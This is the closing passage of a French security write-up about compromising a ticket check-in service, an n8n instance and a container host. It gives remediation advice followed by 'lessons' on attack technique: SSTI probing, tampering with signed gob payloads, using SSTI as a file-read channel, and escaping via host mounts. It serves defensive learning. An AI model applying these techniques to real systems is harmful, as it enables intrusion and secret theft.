2. **Sortir les secrets de l'environnement du process web.** `TICKET_VALIDATION_TOKEN` et `N8N_API_KEY` devraient être dans un gestionnaire de secrets avec rotation ; ils ont tous deux fui par une seule primitive de lecture de fichier.
3. **Check-in :** exiger une session et la propriété du billet, ajouter un nonce/expiration au QR, et surtout **ne jamais construire une commande shell depuis un payload simplement signé**. Utiliser une liste blanche d'actions.
4. **n8n :** ne pas laisser une clé owner dans l'environnement d'un service tiers ; désactiver ou restreindre *Execute Command* ; exécuter le conteneur en non-root.
5. **Conteneurisation :** ne pas bind-monter un répertoire hôte comme `/root` d'un conteneur ; monter `/home` avec `nosuid,nodev`.

**Leçons personnelles :**

- Un test qui « ne marche pas » (`{{7*7}}` littéral) ne prouve pas l'absence de SSTI : il faut tester des **appels de fonction** et pas seulement des expressions arithmétiques.
- Quand un blob binaire est signé, **identifier précisément les octets signés** vaut mieux que deviner la clé (j'ai perdu du temps à brute-forcer rockyou et à tester des clés candidates avant de trouver le SSTI).
- En gob, modifier la taille des données impose de mettre à jour **tous** les préfixes de longueur imbriqués — sinon `unexpected EOF`.
- Une sortie de commande n'est pas nécessaire : ici, le même SSTI servait de canal de lecture pour les fichiers `/tmp/p` et `/tmp/o`.
- La « root dans un conteneur » n'est une vraie frontière que si ce que le conteneur peut écrire sur l'hôte est aussi traité comme surface d'attaque.

---

*Fin du write-up — toutes les étapes ont été rejouées et vérifiées sur la cible le 2026-11-26.*
